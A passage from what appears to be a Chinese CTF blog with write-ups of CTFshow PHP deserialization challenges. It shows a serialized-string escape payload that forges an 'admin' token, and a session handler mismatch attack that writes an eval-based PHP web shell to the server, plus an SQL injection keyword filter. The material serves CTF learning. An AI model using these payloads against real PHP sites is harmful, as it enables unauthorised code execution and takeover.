class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>message.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码，发现和之前做的题大同小异，同样是字符串的增加逃逸，相同的方式进行构造，只不过这一次我们没办法控制cookie，只能向url中传入参数，来造成字符串的逃逸，进而完成污染。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saber</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="variable">$msg</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$msg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span></span><br><span class="line"><span class="comment">// O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:4:&quot;fuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"><span class="comment">// O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:4:&quot;loveU&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里构造出想要的参数后，进行传参：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-10/01.png"></p><p>页面显示正常，则说明传入成功，接着进入 message.php 随便写入一个名为：msg 的cookie，值什么都可以，只要检测出是存在的即可：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-10/02.png"></p><p>传入cookie后即可获得flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;d28da1fc-fe6c-<span class="number">4375</span>-a2de-bd2fbbae1c89&#125;</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>有了上一次的经验，这题解决起来以非常快速，唯一要注意的是源码要求的逻辑。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-9</title>
      <link href="/2023/06/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9/"/>
      <url>/2023/06/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-263"><a href="#题目来源：CTFshow-web入门-php反序列化-263" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-263"></a>题目来源：CTFshow web入门-php反序列化-263</h2><p>打开环境，发现是一个登录页面，找不到序列化利用的点，用扫描工具（disearch）扫描一下环境:</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9/01.png"></p><p>发现环境中有一个 <a href="http://www.zip/">www.zip</a> 资源，直接输入url下载下来，打开发现有许多php代码页，搜寻关键源码：</p><p>index.php 源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//超过5次禁止登陆</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很明显代码中有错误，不会执行 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>)</span><br></pre></td></tr></table></figure><p> 而是执行后面的语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>inc.php 源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::<span class="variable constant_">ATTR_CASE</span> =&gt; PDO::<span class="variable constant_">CASE_NATURAL</span></span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sql注入检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生成唯一标志</span></span><br><span class="line"><span class="comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现代码中含有SQL注入检查，还好没有尝试。在 User 对象中含有两个原生类魔术方法，其中看到我们可以利用的函数：file_put_contents() 。</p><p>这里存在一个知识点，在大型页面的用户登录中存在一个庞大的 session 库，便于存储用户的信息，并且是保存在服务器，而不是存储在本地。这里就涉及到 session 的存储写入方式，默认是语言的 php 方式，同时也可以使用含函数：ini_set()  来指定为另外一种方式：php_serialize ,例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br></pre></td></tr></table></figure><p>两种存储方式截然不同，同时我们可利用的漏洞句就存在于 php 这种写入方式之中。下面给大家演示一下两种存储方式（有能力的道友可以自行搭建一个本地环境进行测试）：</p><p>php :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>); <span class="comment">//可不写，php默认为php写入方法</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;$user&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存储为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user|O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>php_serialize ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>); <span class="comment">// 现在是序列化模式</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;$user&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存储为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>可以看出，两者最大的区别就是，php 方式的前开面多一条 ‘ | ‘ ，代表从竖线后开始执行代码，因此我们可以通过控制竖线的位置来进行漏洞执行。</p><p>简单了解这两种方式过后，从代码中可以分析出，我们在index.php页面下更改cookie，再在 check.php 页面下传入指定参数，即可写入我们的内容文件。</p><p>开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到 base64 编码后的内容，开始写入cookie:</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9/%E5%9B%BE%E4%B8%80.png"></p><p>传入指定参数：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9/%E5%9B%BE%E4%BA%8C.png"></p><p>在log-1.php中测试：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9/%E5%9B%BE%E4%B8%89.png"></p><p>即可得到flag：</p><figure 